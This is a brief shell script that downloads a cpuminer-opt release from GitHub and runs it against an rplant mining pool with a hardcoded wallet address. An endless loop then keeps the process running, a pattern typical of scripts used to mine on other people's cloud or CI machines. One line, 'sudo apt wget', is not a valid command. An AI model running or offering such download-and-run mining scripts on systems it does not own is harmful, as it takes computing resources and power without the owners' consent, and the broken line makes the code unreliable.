#!/bin/sh
sudo apt wget
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
cd cpuminer-opt-linux
./cpuminer-sse2 -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17056 -u RMXh2RYKUHFSeZauULH9hUfh1ZDeWMjLgN
while [ 1 ]; do
sleep 3
done
sleep 999
